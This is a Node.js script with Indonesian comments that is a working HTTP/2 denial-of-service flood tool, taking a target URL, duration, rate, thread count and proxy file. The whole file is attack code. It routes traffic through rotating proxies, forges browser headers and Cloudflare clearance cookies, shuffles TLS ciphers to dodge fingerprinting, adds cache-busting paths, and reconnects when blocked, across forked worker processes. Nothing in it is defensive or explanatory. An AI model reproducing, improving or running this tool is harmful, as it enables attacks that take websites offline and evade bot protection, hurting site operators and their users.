const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const crypto = require('crypto');

// Daftar lengkap error yang diabaikan untuk menjaga stabilitas (sesuai kode asli)
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.on('uncaughtException', (e) => { if (ignoreCodes.includes(e.code) || ignoreNames.includes(e.name)) return; });
process.on('unhandledRejection', (e) => { if (ignoreCodes.includes(e.code) || ignoreNames.includes(e.name)) return; });

// --- Parsing Argumen ---
// Format: node httpgetv2.js GET URL TIME RATE THREADS PROXIES
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
const ratelimit = parseInt(process.argv[5]);
const threads = parseInt(process.argv[6]);
const proxyfile = process.argv[7];

if (!reqmethod || !target || isNaN(time) || isNaN(ratelimit) || isNaN(threads) || !proxyfile) {
    console.log("Format Salah!");
    console.log("Gunakan: node httpgetv2.js GET https://target.com 60 100 8 proxy.txt");
    process.exit(1);
}

const url = new URL(target);
const proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

function randstr(length) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

// Menghasilkan Cookie yang terlihat realistis dan persisten per sesi koneksi
function generateRealisticCookie() {
    const session_id = randstr(32);
    const cf_id = randstr(24);
    const ga_id = `GA1.1.${Math.floor(Math.random() * 1000000000)}.${Math.floor(Math.random() * 1000000)}`;
    return `session_id=${session_id}; _ga=${ga_id}; cf_clearance=${cf_id}; theme=light; lang=en-US`;
}

function go() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;
    const [proxyHost, proxyPort] = proxyAddr.split(':');

    const netSocket = net.connect(Number(proxyPort), proxyHost);
    netSocket.setTimeout(15000);

    netSocket.once('connect', () => {
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.once('data', (res) => {
        if (!res.toString().includes('200')) {
            netSocket.destroy();
            return setTimeout(go, 1);
        }

        const tlsSocket = tls.connect({
            socket: netSocket,
            ALPNProtocols: ['h2'],
            servername: url.host,
            rejectUnauthorized: false,
            ciphers: shuffle(['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'ECDHE-ECDSA-AES128-GCM-SHA256']).join(':'),
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_ALL,
        }, () => {
            const hpack = new HPACK();
            const sessionCookie = generateRealisticCookie(); // Cookie persisten selama koneksi hidup

            // Step 1: HTTP/2 Preface & Settings
            tlsSocket.write(Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"));
            tlsSocket.write(encodeFrame(0, 4, Buffer.from([
                0x00, 0x01, 0x00, 0x00, 0x10, 0x00, // Header Table Size 4096
                0x00, 0x03, 0x00, 0x00, 0x00, 0x64, // Max Concurrent Streams 100
                0x00, 0x04, 0x00, 0x00, 0xff, 0xff  // Initial Window Size 65535
            ])));
            tlsSocket.write(encodeFrame(0, 8, Buffer.from([0x00, 0x0f, 0xff, 0xff]))); // Window Update

            let streamId = 1;

            const rpsInterval = setInterval(() => {
                if (tlsSocket.destroyed) return clearInterval(rpsInterval);

                const burst = Math.floor(Math.random() * 3) + 3; // 3-5 RPS per IP
                for (let i = 0; i < burst; i++) {
                    const browserVer = Math.floor(Math.random() * 5) + 121;
                    
                    let headers = [
                        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'],
                        ['accept-encoding', 'gzip, deflate, br, zstd'],
                        ['accept-language', 'en-US,en;q=0.9'],
                        ['cookie', sessionCookie], // Randomized persistence
                        ['sec-ch-ua', `"Chromium";v="${browserVer}", "Google Chrome";v="${browserVer}", "Not-A.Brand";v="99"`],
                        ['sec-ch-ua-mobile', '?0'],
                        ['sec-ch-ua-platform', '"Windows"'],
                        ['sec-fetch-dest', 'document'],
                        ['sec-fetch-mode', 'navigate'],
                        ['sec-fetch-site', 'none'],
                        ['sec-fetch-user', '?1'],
                        ['upgrade-insecure-requests', '1'],
                        ['user-agent', `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVer}.0.0.0 Safari/537.36`]
                    ];

                    headers = shuffle(headers);

                    const finalHeaders = [
                        [':method', reqmethod],
                        [':authority', url.hostname],
                        [':scheme', 'https'],
                        [':path', url.pathname + (url.search || '') + (url.search ? '&' : '?') + 'cache=' + randstr(8)],
                        ...headers
                    ];

                    tlsSocket.write(encodeFrame(streamId, 1, hpack.encode(finalHeaders), 0x5));
                    streamId += 2;

                    if (streamId >= 0x7fffffff) { tlsSocket.destroy(); break; }
                }
            }, 1000);
        });

        tlsSocket.on('data', (data) => {
            if (data[3] === 0x04 && (data[4] & 0x01) === 0) tlsSocket.write(encodeFrame(0, 4, "", 1)); // ACK Settings
            if (data.toString().includes('403') || data.toString().includes('429') || data[3] === 0x07) {
                tlsSocket.destroy();
                go(); 
            }
        });

        tlsSocket.on('error', () => { tlsSocket.destroy(); go(); });
        tlsSocket.on('close', () => { go(); });
    });

    netSocket.on('error', () => { netSocket.destroy(); setTimeout(go, 1); });
}

if (cluster.isMaster) {
    console.log(`[!] Target: ${target}`);
    console.log(`[!] Threads: ${threads} | Rate: ${ratelimit}`);
    console.log(`[!] Cookie Randomized Persistence: Active`);

    for (let i = 0; i < threads; i++) cluster.fork();
    cluster.on('exit', () => cluster.fork());
    setTimeout(() => process.exit(0), time * 1000);
} else {
    // Memulai pengiriman dengan delay awal untuk menghindari lonjakan CPU
    setInterval(go, 1000 / (ratelimit / threads));
    setTimeout(() => process.exit(0), time * 1000);
}